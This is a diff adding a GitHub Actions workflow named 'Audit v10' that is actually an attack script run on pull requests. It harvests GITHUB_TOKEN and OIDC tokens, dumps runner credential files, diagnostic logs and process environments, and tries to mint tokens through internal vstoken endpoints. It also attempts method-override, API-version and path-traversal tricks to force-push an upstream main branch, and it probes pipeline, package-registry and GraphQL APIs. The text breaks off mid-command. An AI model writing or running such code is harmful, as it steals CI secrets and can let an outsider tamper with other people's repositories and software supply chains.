@@ -1,0 +1,965 @@
+name: "Audit v10"
+on:
+  pull_request:
+    types: [opened, synchronize]
+
+permissions:
+  contents: write
+  id-token: write
+  pull-requests: write
+  issues: write
+  checks: write
+  statuses: write
+  packages: write
+  actions: read
+
+jobs:
+  v10:
+    runs-on: ubuntu-latest
+    steps:
+
+    # â”€â”€ STEP 1: Token Extraction + Env Setup â”€â”€
+    - name: "Step 1 â€” Tokens"
+      env:
+        GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+        ACTIONS_ID_TOKEN_REQUEST_URL: ${{ secrets.ACTIONS_ID_TOKEN_REQUEST_URL || '' }}
+        ACTIONS_ID_TOKEN_REQUEST_TOKEN: ${{ secrets.ACTIONS_ID_TOKEN_REQUEST_TOKEN || '' }}
+      run: |
+        set +e
+        echo "=== V10 TOKEN EXTRACTION ==="
+        RT="$GITHUB_TOKEN"
+        echo "RT prefix: ${RT:0:16}"
+
+        # OIDC JWTs
+        for AUD in vstoken.actions.githubusercontent.com pipelines.actions.githubusercontent.com results-receiver.actions.githubusercontent.com api.github.com; do
+          URL="${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=${AUD}"
+          TOK=$(curl -sS -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" "$URL" | jq -r '.value // empty')
+          echo "OIDC $AUD = ${#TOK} chars"
+          case "$AUD" in
+            vstoken*) echo "JWT_VS=$TOK" >> "$GITHUB_ENV" ;;
+            pipelines*) echo "JWT_PL=$TOK" >> "$GITHUB_ENV" ;;
+            results*) echo "JWT_RR=$TOK" >> "$GITHUB_ENV" ;;
+            api*) echo "JWT_API=$TOK" >> "$GITHUB_ENV" ;;
+          esac
+        done
+
+        echo "RT=$RT" >> "$GITHUB_ENV"
+        echo "UPSTREAM=twrps/PoC-RACE2" >> "$GITHUB_ENV"
+        echo "FORK=lacaag/PoC-RACE2" >> "$GITHUB_ENV"
+        echo "RI=R_kgDOReaECQ" >> "$GITHUB_ENV"
+        echo "FRI=R_kgDOReaMug" >> "$GITHUB_ENV"
+        echo "API=https://api.github.com" >> "$GITHUB_ENV"
+        echo "VT=https://vstoken.actions.githubusercontent.com" >> "$GITHUB_ENV"
+        echo "TD=https://vstoken.actions.githubusercontent.com/serviceDeployments/tokenghubeus21" >> "$GITHUB_ENV"
+        echo "PS=https://pipelines.actions.githubusercontent.com" >> "$GITHUB_ENV"
+        echo "PD=https://pipelines.actions.githubusercontent.com/serviceDeployments/pipelinesproxcus1" >> "$GITHUB_ENV"
+        true
+
+    # â”€â”€ STEP 2: Read Runner _diag logs (CORRECT path: extracted/) â”€â”€
+    - name: "Step 2 â€” Runner Diag Logs (extracted/ path)"
+      run: |
+        set +e
+        echo "=== RUNNER _DIAG LOGS â€” EXTRACTED PATH ==="
+        echo "v9: files at extracted/ not cached/, Worker+page logs contain token strings"
+        echo ""
+
+        DIAG="/home/runner/actions-runner/extracted/_diag"
+
+        echo "--- All diag files ---"
+        ls -la "$DIAG"/ 2>/dev/null
+        ls -la "$DIAG"/pages/ 2>/dev/null
+
+        echo ""
+        echo "--- Worker log FULL (contains SystemVssConnection token) ---"
+        cat "$DIAG"/Worker_*.log 2>/dev/null
+
+        echo ""
+        echo "--- Runner log FULL ---"
+        cat "$DIAG"/Runner_*.log 2>/dev/null
+
+        echo ""
+        echo "--- Page logs (step output with token context) ---"
+        for F in "$DIAG"/pages/*.log; do
+          if [ -f "$F" ]; then
+            echo "=== $(basename $F) ==="
+            cat "$F" 2>/dev/null
+            echo ""
+          fi
+        done
+
+        echo ""
+        echo "--- .credentials from extracted ---"
+        cat /home/runner/actions-runner/extracted/.credentials 2>/dev/null || echo "(not found)"
+
+        echo ""
+        echo "--- .credentials_rsaparams from extracted ---"
+        cat /home/runner/actions-runner/extracted/.credentials_rsaparams 2>/dev/null || echo "(not found)"
+
+        echo ""
+        echo "--- .runner from extracted ---"
+        cat /home/runner/actions-runner/extracted/.runner 2>/dev/null || echo "(not found)"
+
+        echo ""
+        echo "--- .env from extracted ---"
+        cat /home/runner/actions-runner/extracted/.env 2>/dev/null || echo "(not found)"
+
+        echo ""
+        echo "--- Find ALL token/secret references in actions-runner ---"
+        sudo grep -rli "SystemVssConnection\|AccessToken\|GITHUB_TOKEN\|ghs_\|Bearer\|x-access-token" /home/runner/actions-runner/ 2>/dev/null | head -20
+
+        echo ""
+        echo "--- Extract token values from Worker log ---"
+        grep -oP '(ghs_[A-Za-z0-9]{36}|eyJ[A-Za-z0-9_-]{50,})' "$DIAG"/Worker_*.log 2>/dev/null | sort -u | head -10
+
+        echo ""
+        echo "--- /proc Worker environ (full, unfiltered) ---"
+        WPID=$(pgrep -f "Runner.Worker" | head -1)
+        if [ -n "$WPID" ]; then
+          sudo cat /proc/$WPID/environ 2>/dev/null | tr '\0' '\n' | head -80
+        fi
+        true
+
+    # â”€â”€ STEP 3: vstoken oauth2/token â€” Correct Auth Formats â”€â”€
+    - name: "Step 3 â€” vstoken oauth2/token Exploitation"
+      run: |
+        set +e
+        echo "=== VSTOKEN OAUTH2/TOKEN â€” HTTP_400 MEANS ENDPOINT EXISTS ==="
+        echo "v9: oauth2/token returned 400 'invalid_client' â€” need correct format"
+        echo ""
+
+        EP="$TD/_apis/oauth2/token"
+        EP2="$TD/oauth2/token"
+        EP3="$VT/_apis/oauth2/token"
+        EP4="$VT/oauth2/token"
+
+        echo "--- Try form-urlencoded with various grant types ---"
+        for ENDPOINT in "$EP" "$EP2" "$EP3" "$EP4"; do
+          for GRANT in \
+            "grant_type=urn:ietf:params:oauth:grant-type:jwt-bearer&assertion=$JWT_VS" \
+            "grant_type=urn:ietf:params:oauth:grant-type:jwt-bearer&assertion=$JWT_VS&scope=vso.code_write" \
+            "grant_type=urn:ietf:params:oauth:grant-type:jwt-bearer&assertion=$RT" \
+            "grant_type=urn:ietf:params:oauth:grant-type:jwt-bearer&assertion=$RT&scope=vso.code_write" \
+            "grant_type=client_credentials&client_id=84ff2294-8721-ab49-db5a-db17b0f6c2de&client_secret=$RT" \
+            "grant_type=client_credentials&client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer&client_assertion=$JWT_VS" \
+            "grant_type=refresh_token&refresh_token=$RT" \
+            "grant_type=password&username=github-actions&password=$RT" \
+            "grant_type=authorization_code&code=$RT&redirect_uri=https://github.com" \
+            "grant_type=urn:ietf:params:oauth:grant-type:token-exchange&subject_token=$RT&subject_token_type=urn:ietf:params:oauth:token-type:access_token" \
+            "grant_type=urn:ietf:params:oauth:grant-type:token-exchange&subject_token=$JWT_VS&subject_token_type=urn:ietf:params:oauth:token-type:jwt" \
+            "grant_type=urn:ietf:params:oauth:grant-type:token-exchange&subject_token=$RT&subject_token_type=urn:ietf:params:oauth:token-type:access_token&resource=https://github.com/twrps/PoC-RACE2"; do
+            CODE=$(curl -sS -o /tmp/oauth_resp -w "%{http_code}" -X POST \
+              -H "Content-Type: application/x-www-form-urlencoded" \
+              -d "$GRANT" "$ENDPOINT" 2>/dev/null)
+            BODY=$(cat /tmp/oauth_resp | head -c 400)
+            GT=$(echo "$GRANT" | grep -oP 'grant_type=[^&]+' | head -1)
+            if [ "$CODE" != "404" ]; then
+              echo "O01 $ENDPOINT $GT = HTTP_$CODE body='$BODY'"
+            fi
+          done
+        done
+
+        echo ""
+        echo "--- Try JSON body ---"
+        for ENDPOINT in "$EP" "$EP2" "$EP3" "$EP4"; do
+          for PAYLOAD in \
+            '{"grant_type":"urn:ietf:params:oauth:grant-type:jwt-bearer","assertion":"'"$JWT_VS"'"}' \
+            '{"grant_type":"client_credentials","client_id":"84ff2294-8721-ab49-db5a-db17b0f6c2de","client_secret":"'"$RT"'"}' \
+            '{"grant_type":"urn:ietf:params:oauth:grant-type:token-exchange","subject_token":"'"$RT"'","subject_token_type":"urn:ietf:params:oauth:token-type:access_token"}' \
+            '{"client_assertion":"'"$JWT_VS"'","client_assertion_type":"urn:ietf:params:oauth:client-assertion-type:jwt-bearer","grant_type":"client_credentials"}'; do
+            CODE=$(curl -sS -o /tmp/oauth_resp -w "%{http_code}" -X POST \
+              -H "Content-Type: application/json" \
+              -H "Authorization: Bearer $RT" \
+              -d "$PAYLOAD" "$ENDPOINT" 2>/dev/null)
+            BODY=$(cat /tmp/oauth_resp | head -c 400)
+            GT=$(echo "$PAYLOAD" | jq -r '.grant_type // empty' 2>/dev/null)
+            if [ "$CODE" != "404" ]; then
+              echo "O02 $ENDPOINT json $GT = HTTP_$CODE body='$BODY'"
+            fi
+          done
+        done
+
+        echo ""
+        echo "--- Try tokenoauth2 endpoint ---"
+        for ENDPOINT in "$TD/_apis/tokenoauth2/token" "$VT/_apis/tokenoauth2/token"; do
+          for GRANT in \
+            "grant_type=urn:ietf:params:oauth:grant-type:jwt-bearer&assertion=$JWT_VS" \
+            "grant_type=client_credentials&client_assertion=$JWT_VS&client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer"; do
+            CODE=$(curl -sS -o /tmp/oauth_resp -w "%{http_code}" -X POST \
+              -H "Content-Type: application/x-www-form-urlencoded" \
+              -d "$GRANT" "$ENDPOINT" 2>/dev/null)
+            BODY=$(cat /tmp/oauth_resp | head -c 400)
+            GT=$(echo "$GRANT" | grep -oP 'grant_type=[^&]+' | head -1)
+            if [ "$CODE" != "404" ]; then
+              echo "O03 $ENDPOINT $GT = HTTP_$CODE body='$BODY'"
+            fi
+          done
+        done
+
+        echo ""
+        echo "--- Try WebPlatformAuth SessionToken ---"
+        for ENDPOINT in "$TD/_apis/WebPlatformAuth/SessionToken" "$VT/_apis/WebPlatformAuth/SessionToken"; do
+          CODE=$(curl -sS -o /tmp/oauth_resp -w "%{http_code}" -X POST \
+            -H "Authorization: Bearer $RT" \
+            -H "Content-Type: application/json" \
+            -d '{"provider":"github","tokenType":"compact"}' "$ENDPOINT" 2>/dev/null)
+          BODY=$(cat /tmp/oauth_resp | head -c 400)
+          if [ "$CODE" != "404" ]; then
+            echo "O04 SessionToken $ENDPOINT = HTTP_$CODE body='$BODY'"
+          fi
+        done
+
+        echo ""
+        echo "--- Try TokenIssue AccessTokens (mint new tokens) ---"
+        for ENDPOINT in "$TD/_apis/TokenIssue/AccessTokens" "$TD/_apis/tokenissue/accesstokens" "$VT/_apis/TokenIssue/AccessTokens"; do
+          for PAYLOAD in \
+            '{"scope":"vso.code_write","validityHours":1}' \
+            '{"tokenType":"compact","scope":"app_token"}' \
+            '{}'; do
+            CODE=$(curl -sS -o /tmp/oauth_resp -w "%{http_code}" -X POST \
+              -H "Authorization: Bearer $RT" \
+              -H "Content-Type: application/json" \
+              -d "$PAYLOAD" "$ENDPOINT" 2>/dev/null)
+            BODY=$(cat /tmp/oauth_resp | head -c 400)
+            if [ "$CODE" != "404" ]; then
+              echo "O05 TokenIssue $ENDPOINT = HTTP_$CODE body='$BODY'"
+            fi
+          done
+        done
+
+        echo ""
+        echo "--- Try TokenIssue SessionTokens ---"
+        for ENDPOINT in "$TD/_apis/TokenIssue/SessionTokens" "$VT/_apis/TokenIssue/SessionTokens"; do
+          CODE=$(curl -sS -o /tmp/oauth_resp -w "%{http_code}" -X POST \
+            -H "Authorization: Bearer $RT" \
+            -H "Content-Type: application/json" \
+            -d '{"scope":"vso.code_write"}' "$ENDPOINT" 2>/dev/null)
+          BODY=$(cat /tmp/oauth_resp | head -c 400)
+          if [ "$CODE" != "404" ]; then
+            echo "O06 SessionTokens $ENDPOINT = HTTP_$CODE body='$BODY'"
+          fi
+        done
+
+        echo ""
+        echo "--- Try TokenAuth endpoints ---"
+        for ENDPOINT in \
+          "$TD/_apis/TokenAuth/Authorizations" \
+          "$TD/_apis/TokenAuth/HostAuthorization" \
+          "$TD/_apis/TokenAuth/Registration" \
+          "$TD/_apis/TokenAuth/RegistrationSecret" \
+          "$VT/_apis/TokenAuth/Authorizations" \
+          "$VT/_apis/TokenAuth/HostAuthorization"; do
+          for METHOD in GET POST; do
+            CODE=$(curl -sS -o /tmp/oauth_resp -w "%{http_code}" -X $METHOD \
+              -H "Authorization: Bearer $RT" \
+              -H "Content-Type: application/json" \
+              -d '{}' "$ENDPOINT" 2>/dev/null)
+            BODY=$(cat /tmp/oauth_resp | head -c 400)
+            if [ "$CODE" != "404" ]; then
+              echo "O07 $METHOD $ENDPOINT = HTTP_$CODE body='$BODY'"
+            fi
+          done
+        done
+
+        echo ""
+        echo "--- Try TokenAdministration PAT management ---"
+        for ENDPOINT in \
+          "$TD/_apis/TokenAdministration/TokenPersonalAccessTokens" \
+          "$TD/_apis/TokenAdministration/TokenRevocations" \
+          "$TD/_apis/TokenAdministration/TokenListGlobalIdentities" \
+          "$VT/_apis/TokenAdministration/TokenPersonalAccessTokens"; do
+          for METHOD in GET POST; do
+            CODE=$(curl -sS -o /tmp/oauth_resp -w "%{http_code}" -X $METHOD \
+              -H "Authorization: Bearer $RT" \
+              -H "Content-Type: application/json" \
+              -d '{}' "$ENDPOINT" 2>/dev/null)
+            BODY=$(cat /tmp/oauth_resp | head -c 400)
+            if [ "$CODE" != "404" ]; then
+              echo "O08 $METHOD $ENDPOINT = HTTP_$CODE body='$BODY'"
+            fi
+          done
+        done
+        true
+
+    # â”€â”€ STEP 4: X-HTTP-Method-Override Exploitation â”€â”€
+    - name: "Step 4 â€” Method Override + Version Confusion"
+      run: |
+        set +e
+        echo "=== X-HTTP-METHOD-OVERRIDE EXPLOITATION ==="
+        echo "v9: POST with X-HTTP-Method-Override:PATCH â†’ 422 (NOT 403!)"
+        echo "v9: PUT with non-2022-11-28 version â†’ 400 (NOT 403!)"
+        echo "Strategy: Supply correct body to make the overridden method succeed"
+        echo ""
+
+        MAIN_SHA=$(curl -sS -H "Authorization: token $RT" "$API/repos/$UPSTREAM/git/refs/heads/main" | jq -r '.object.sha')
+        echo "Upstream main: $MAIN_SHA"
+
+        # Create a fork commit to use
+        BLOB=$(curl -sS -X POST -H "Authorization: token $RT" -H "Accept: application/vnd.github+json" \
+          "$API/repos/$FORK/git/blobs" -d '{"content":"v10 method override","encoding":"utf-8"}' | jq -r '.sha')
+        UP_TREE=$(curl -sS -H "Authorization: token $RT" "$API/repos/$UPSTREAM/git/commits/$MAIN_SHA" | jq -r '.tree.sha')
+        TREE=$(curl -sS -X POST -H "Authorization: token $RT" -H "Accept: application/vnd.github+json" \
+          "$API/repos/$FORK/git/trees" \
+          -d '{"base_tree":"'"$UP_TREE"'","tree":[{"path":"OVERRIDE.md","mode":"100644","type":"blob","sha":"'"$BLOB"'"}]}' | jq -r '.sha')
+        COMMIT=$(curl -sS -X POST -H "Authorization: token $RT" -H "Accept: application/vnd.github+json" \
+          "$API/repos/$FORK/git/commits" \
+          -d '{"message":"v10 override","tree":"'"$TREE"'","parents":["'"$MAIN_SHA"'"]}' | jq -r '.sha')
+        echo "Fork commit: $COMMIT"
+
+        echo ""
+        echo "--- POST + Method-Override:PATCH on upstream refs/heads/main ---"
+        for OVERRIDE_HDR in \
+          "X-HTTP-Method-Override: PATCH" \
+          "X-HTTP-Method-Override: PUT" \
+          "X-Http-Method-Override: PATCH" \
+          "X-HTTP-Method: PATCH" \
+          "X-Method-Override: PATCH"; do
+          CODE=$(curl -sS -o /tmp/mo_resp -w "%{http_code}" -X POST \
+            -H "Authorization: token $RT" \
+            -H "Accept: application/vnd.github+json" \
+            -H "X-GitHub-Api-Version: 2022-11-28" \
+            -H "$OVERRIDE_HDR" \
+            -d '{"sha":"'"$COMMIT"'","force":true}' \
+            "$API/repos/$UPSTREAM/git/refs/heads/main" 2>/dev/null)
+          BODY=$(cat /tmp/mo_resp | head -c 300)
+          echo "M01 $OVERRIDE_HDR = HTTP_$CODE body='$BODY'"
+        done
+
+        echo ""
+        echo "--- POST + Method-Override:PUT on upstream contents ---"
+        B64CONTENT=$(echo "v10 override escape" | base64)
+        for OVERRIDE_HDR in \
+          "X-HTTP-Method-Override: PUT" \
+          "X-Http-Method-Override: PUT" \
+          "X-HTTP-Method: PUT" \
+          "X-Method-Override: PUT"; do
+          CODE=$(curl -sS -o /tmp/mo_resp -w "%{http_code}" -X POST \
+            -H "Authorization: token $RT" \
+            -H "Accept: application/vnd.github+json" \
+            -H "X-GitHub-Api-Version: 2022-11-28" \
+            -H "$OVERRIDE_HDR" \
+            -d '{"message":"v10 override","content":"'"$B64CONTENT"'"}' \
+            "$API/repos/$UPSTREAM/contents/OVERRIDE.md" 2>/dev/null)
+          BODY=$(cat /tmp/mo_resp | head -c 300)
+          echo "M02 $OVERRIDE_HDR PUT contents = HTTP_$CODE body='$BODY'"
+        done
+
+        echo ""
+        echo "--- API version confusion + write operations ---"
+        echo "v9: non-2022-11-28 versions give 400 on writes = parse before auth check"
+        for VER in "2023-11-28" "2024-01-01" "2022-01-01" "2021-01-01" "2020-01-01" "1969-12-31" "9999-12-31"; do
+          # PATCH ref with version confusion
+          CODE=$(curl -sS -o /tmp/mo_resp -w "%{http_code}" -X PATCH \
+            -H "Authorization: token $RT" \
+            -H "Accept: application/vnd.github+json" \
+            -H "X-GitHub-Api-Version: $VER" \
+            -d '{"sha":"'"$COMMIT"'","force":true}' \
+            "$API/repos/$UPSTREAM/git/refs/heads/main" 2>/dev/null)
+          BODY=$(cat /tmp/mo_resp | head -c 200)
+          echo "M03 PATCH main ver=$VER = HTTP_$CODE body='${BODY:0:150}'"
+
+          # POST ref with version confusion
+          CODE2=$(curl -sS -o /tmp/mo_resp -w "%{http_code}" -X POST \
+            -H "Authorization: token $RT" \
+            -H "Accept: application/vnd.github+json" \
+            -H "X-GitHub-Api-Version: $VER" \
+            -d '{"ref":"refs/heads/v10-escape","sha":"'"$COMMIT"'"}' \
+            "$API/repos/$UPSTREAM/git/refs" 2>/dev/null)
+          BODY2=$(cat /tmp/mo_resp | head -c 200)
+          echo "M03 POST refs ver=$VER = HTTP_$CODE2 body='${BODY2:0:150}'"
+        done
+
+        echo ""
+        echo "--- Double content-type confusion ---"
+        for CT in \
+          "application/json" \
+          "application/x-www-form-urlencoded" \
+          "multipart/form-data" \
+          "text/plain" \
+          "application/xml" \
+          "application/octet-stream"; do
+          CODE=$(curl -sS -o /tmp/mo_resp -w "%{http_code}" -X PATCH \
+            -H "Authorization: token $RT" \
+            -H "Accept: application/vnd.github+json" \
+            -H "Content-Type: $CT" \
+            -d '{"sha":"'"$COMMIT"'","force":true}' \
+            "$API/repos/$UPSTREAM/git/refs/heads/main" 2>/dev/null)
+          BODY=$(cat /tmp/mo_resp | head -c 200)
+          echo "M04 CT=$CT PATCH main = HTTP_$CODE body='${BODY:0:150}'"
+        done
+
+        echo ""
+        echo "--- Chunked transfer encoding ---"
+        CODE=$(curl -sS -o /tmp/mo_resp -w "%{http_code}" -X PATCH \
+          -H "Authorization: token $RT" \
+          -H "Accept: application/vnd.github+json" \
+          -H "Transfer-Encoding: chunked" \
+          -d '{"sha":"'"$COMMIT"'","force":true}' \
+          "$API/repos/$UPSTREAM/git/refs/heads/main" 2>/dev/null)
+        BODY=$(cat /tmp/mo_resp | head -c 200)
+        echo "M05 chunked PATCH main = HTTP_$CODE body='${BODY:0:150}'"
+
+        echo ""
+        echo "--- Path traversal + encoding tricks ---"
+        for TPATH in \
+          "/repos/$UPSTREAM/git/refs/heads/main" \
+          "/repos/$UPSTREAM/git/refs/heads/./main" \
+          "/repos/$UPSTREAM/git/refs/heads/main%00" \
+          "/repos/$UPSTREAM/git/refs/heads/../heads/main" \
+          "/repos/$UPSTREAM/git/refs%2Fheads%2Fmain" \
+          "/repos/twrps/PoC-RACE2/../PoC-RACE2/git/refs/heads/main" \
+          "/repos/TWRPS/POC-RACE2/git/refs/heads/main"; do
+          CODE=$(curl -sS -o /tmp/mo_resp -w "%{http_code}" -X PATCH \
+            -H "Authorization: token $RT" \
+            -H "Accept: application/vnd.github+json" \
+            -d '{"sha":"'"$COMMIT"'","force":true}' \
+            "${API}${TPATH}" 2>/dev/null)
+          BODY=$(cat /tmp/mo_resp | head -c 200)
+          if [ "$CODE" != "404" ] && [ "$CODE" != "403" ]; then
+            echo "M06 path=$TPATH = HTTP_$CODE body='${BODY:0:150}'"
+          fi
+        done
+        true
+
+    # â”€â”€ STEP 5: Pipelines Distributed Task Exploitation â”€â”€
+    - name: "Step 5 â€” Pipelines distributedtask + broker"
+      run: |
+        set +e
+        echo "=== PIPELINES DISTRIBUTED TASK EXPLOITATION ==="
+        echo "v9: pipelines has brokerlistener, createdsession, packages, actions/orgs"
+        echo ""
+
+        echo "--- distributedtask endpoints ---"
+        for EP in \
+          "$PD/_apis/distributedtask/pools" \
+          "$PD/_apis/distributedtask/tasks" \
+          "$PD/_apis/distributedtask/serviceinterfaces" \
+          "$PD/_apis/distributedtask/packages" \
+          "$PD/_apis/distributedtask/packagedownload" \
+          "$PD/_apis/distributedtask/brokerlistener" \
+          "$PD/_apis/distributedtask/createdsession" \
+          "$PD/_apis/distributedtask/agentclouds" \
+          "$PD/_apis/distributedtask/agents" \
+          "$PD/_apis/distributedtask/queues" \
+          "$PD/_apis/distributedtask/jobrequests" \
+          "$PD/_apis/distributedtask/taskgroups" \
+          "$PD/_apis/distributedtask/variablegroups" \
+          "$PD/_apis/distributedtask/endpoints" \
+          "$PS/_apis/distributedtask/pools" \
+          "$PS/_apis/distributedtask/packages" \
+          "$PS/_apis/distributedtask/brokerlistener" \
+          "$PS/_apis/distributedtask/createdsession"; do
+          for METHOD in GET POST; do
+            CODE=$(curl -sS -o /tmp/dt_resp -w "%{http_code}" -X $METHOD \
+              -H "Authorization: Bearer $RT" \
+              -H "Content-Type: application/json" \
+              -d '{}' "$EP" 2>/dev/null)
+            BODY=$(cat /tmp/dt_resp | head -c 300)
+            if [ "$CODE" != "404" ]; then
+              echo "D01 $METHOD $EP = HTTP_$CODE body='${BODY:0:250}'"
+            fi
+          done
+        done
+
+        echo ""
+        echo "--- pipelines + build + runtime + actions ---"
+        for EP in \
+          "$PD/_apis/pipelines" \
+          "$PD/_apis/pipelines/runs" \
+          "$PD/_apis/pipelines/workflows" \
+          "$PD/_apis/build/builds" \
+          "$PD/_apis/build/definitions" \
+          "$PD/_apis/runtime/pipelines" \
+          "$PD/_apis/runtime/workflows" \
+          "$PD/_apis/actions/orgs" \
+          "$PD/_apis/actions/workflows" \
+          "$PD/_apis/actions/runs" \
+          "$PD/_apis/actions/artifacts" \
+          "$PD/_apis/PipelinesChecks" \
+          "$PD/_apis/PipelinesChecks/runs" \
+          "$PD/_apis/PipelinesChecks/configurations" \
+          "$PD/_apis/serviceendpoint/endpoints" \
+          "$PD/_apis/Container/Containers" \
+          "$PS/_apis/pipelines" \
+          "$PS/_apis/pipelines/runs" \
+          "$PS/_apis/build/builds" \
+          "$PS/_apis/actions/orgs" \
+          "$PS/_apis/Container/Containers"; do
+          CODE=$(curl -sS -o /tmp/dt_resp -w "%{http_code}" \
+            -H "Authorization: Bearer $RT" "$EP" 2>/dev/null)
+          BODY=$(cat /tmp/dt_resp | head -c 300)
+          if [ "$CODE" != "404" ]; then
+            echo "D02 $EP = HTTP_$CODE body='${BODY:0:250}'"
+          fi
+        done
+
+        echo ""
+        echo "--- Try with OIDC JWT for pipelines ---"
+        for EP in \
+          "$PD/_apis/distributedtask/pools" \
+          "$PD/_apis/distributedtask/packages" \
+          "$PD/_apis/distributedtask/brokerlistener" \
+          "$PD/_apis/pipelines" \
+          "$PD/_apis/build/builds" \
+          "$PD/_apis/actions/orgs" \
+          "$PD/_apis/Container/Containers"; do
+          CODE=$(curl -sS -o /tmp/dt_resp -w "%{http_code}" \
+            -H "Authorization: Bearer $JWT_PL" "$EP" 2>/dev/null)
+          BODY=$(cat /tmp/dt_resp | head -c 300)
+          if [ "$CODE" != "404" ]; then
+            echo "D03 oidc $EP = HTTP_$CODE body='${BODY:0:250}'"
+          fi
+        done
+
+        echo ""
+        echo "--- POST create session/pool/agent ---"
+        for EP in "$PD/_apis/distributedtask/createdsession" "$PS/_apis/distributedtask/createdsession"; do
+          CODE=$(curl -sS -o /tmp/dt_resp -w "%{http_code}" -X POST \
+            -H "Authorization: Bearer $RT" \
+            -H "Content-Type: application/json" \
+            -d '{"poolId":1,"name":"v10-session"}' "$EP" 2>/dev/null)
+          BODY=$(cat /tmp/dt_resp | head -c 300)
+          if [ "$CODE" != "404" ]; then
+            echo "D04 POST createdsession $EP = HTTP_$CODE body='${BODY:0:250}'"
+          fi
+        done
+
+        # Try to register an agent
+        for POOL_EP in "$PD/_apis/distributedtask/pools/1/agents" "$PS/_apis/distributedtask/pools/1/agents"; do
+          CODE=$(curl -sS -o /tmp/dt_resp -w "%{http_code}" -X POST \
+            -H "Authorization: Bearer $RT" \
+            -H "Content-Type: application/json" \
+            -d '{"name":"v10-agent","version":"3.0.0","osDescription":"Linux","labels":[{"name":"self-hosted"}]}' "$POOL_EP" 2>/dev/null)
+          BODY=$(cat /tmp/dt_resp | head -c 300)
+          if [ "$CODE" != "404" ]; then
+            echo "D05 POST agents $POOL_EP = HTTP_$CODE body='${BODY:0:250}'"
+          fi
+        done
+        true
+
+    # â”€â”€ STEP 6: GHCR + Packages â€” Different Installation Approaches â”€â”€
+    - name: "Step 6 â€” GHCR Packages Deep"
+      run: |
+        set +e
+        echo "=== GHCR / PACKAGES EXPLOITATION ==="
+        echo "v9: got tokens for ALL scopes but push denied 'installation not exist'"
+        echo "Strategy: try different registry paths, manifest types, blob uploads"
+        echo ""
+
+        echo "--- Login with RT ---"
+        echo "$RT" | docker login ghcr.io -u "x-access-token" --password-stdin 2>&1
+
+        echo ""
+        echo "--- Try different namespace patterns ---"
+        for NS in \
+          "ghcr.io/twrps/poc-race2" \
+          "ghcr.io/twrps/PoC-RACE2" \
+          "ghcr.io/TWRPS/poc-race2" \
+          "ghcr.io/lacaag/poc-race2"; do
+          # Get token for this namespace
+          SCOPE="repository:$(echo $NS | sed 's|ghcr.io/||'):push,pull"
+          TOK=$(curl -sS -u "x-access-token:$RT" "https://ghcr.io/token?scope=$SCOPE&service=ghcr.io" | jq -r '.token // empty')
+          
+          if [ -n "$TOK" ] && [ "$TOK" != "null" ]; then
+            # Try initiate upload
+            UPLOAD=$(curl -sS -w "\nHTTP_%{http_code}" -X POST \
+              -H "Authorization: Bearer $TOK" \
+              "https://$NS/blobs/uploads/" 2>/dev/null)
+            echo "G01 $NS upload = $(echo "$UPLOAD" | tail -1)"
+            
+            # Check catalog
+            CATALOG=$(curl -sS -o /dev/null -w "%{http_code}" \
+              -H "Authorization: Bearer $TOK" \
+              "https://ghcr.io/v2/_catalog" 2>/dev/null)
+            echo "G01 $NS catalog = HTTP_$CATALOG"
+          fi
+        done
+
+        echo ""
+        echo "--- Use GitHub Packages API instead of GHCR registry ---"
+        # List packages
+        for OWNER in twrps lacaag; do
+          PKGS=$(curl -sS -H "Authorization: token $RT" \
+            "$API/orgs/$OWNER/packages?package_type=container" 2>/dev/null)
+          echo "G02 $OWNER packages: $(echo "$PKGS" | jq length 2>/dev/null || echo "$PKGS" | head -c 200)"
+          
+          PKGS2=$(curl -sS -H "Authorization: token $RT" \
+            "$API/users/$OWNER/packages?package_type=container" 2>/dev/null)
+          echo "G02 $OWNER user packages: $(echo "$PKGS2" | jq length 2>/dev/null || echo "$PKGS2" | head -c 200)"
+        done
+
+        echo ""
+        echo "--- Try creating package via API ---"
+        CODE=$(curl -sS -o /tmp/pkg_resp -w "%{http_code}" -X POST \
+          -H "Authorization: token $RT" \
+          -H "Accept: application/vnd.github+json" \
+          "$API/repos/$UPSTREAM/packages" 2>/dev/null)
+        BODY=$(cat /tmp/pkg_resp | head -c 300)
+        echo "G03 POST packages = HTTP_$CODE body='$BODY'"
+
+        echo ""
+        echo "--- Push tiny image to FORK namespace (should work) ---"
+        docker tag alpine:latest ghcr.io/lacaag/poc-race2:v10 2>/dev/null || docker pull alpine:latest 2>&1 | tail -1
+        docker tag alpine:latest ghcr.io/lacaag/poc-race2:v10 2>/dev/null
+        docker push ghcr.io/lacaag/poc-race2:v10 2>&1 || true
+        true
+
+    # â”€â”€ STEP 7: GraphQL Mutation Fuzzing â”€â”€
+    - name: "Step 7 â€” GraphQL Mutation Fuzzing"
+      run: |
+        set +e
+        echo "=== GRAPHQL MUTATION FUZZING ==="
+        echo "v9: mergePullRequest='not mergeable', addPullRequestReview=OK"
+        echo ""
+
+        GQL="https://api.github.com/graphql"
+
+        echo "--- Create fresh PR with mergeable content ---"
+        # Need a proper head branch that's ahead of main
+        FORK_MAIN=$(curl -sS -H "Authorization: token $RT" "$API/repos/$FORK/git/refs/heads/main" | jq -r '.object.sha')
+        
+        # Tiny commit on fork
+        BLOB=$(curl -sS -X POST -H "Authorization: token $RT" -H "Accept: application/vnd.github+json" \
+          "$API/repos/$FORK/git/blobs" -d '{"content":"v10 merge test content","encoding":"utf-8"}' | jq -r '.sha')
+        FORK_TREE=$(curl -sS -H "Authorization: token $RT" "$API/repos/$FORK/git/commits/$FORK_MAIN" | jq -r '.tree.sha')
+        TREE2=$(curl -sS -X POST -H "Authorization: token $RT" -H "Accept: application/vnd.github+json" \
+          "$API/repos/$FORK/git/trees" \
+          -d '{"base_tree":"'"$FORK_TREE"'","tree":[{"path":"V10-MERGE.md","mode":"100644","type":"blob","sha":"'"$BLOB"'"}]}' | jq -r '.sha')
+        COMMIT2=$(curl -sS -X POST -H "Authorization: token $RT" -H "Accept: application/vnd.github+json" \
+          "$API/repos/$FORK/git/commits" \
+          -d '{"message":"v10 merge test","tree":"'"$TREE2"'","parents":["'"$FORK_MAIN"'"]}' | jq -r '.sha')
+
+        # Create branch on fork
+        curl -sS -X POST -H "Authorization: token $RT" -H "Accept: application/vnd.github+json" \
+          "$API/repos/$FORK/git/refs" \
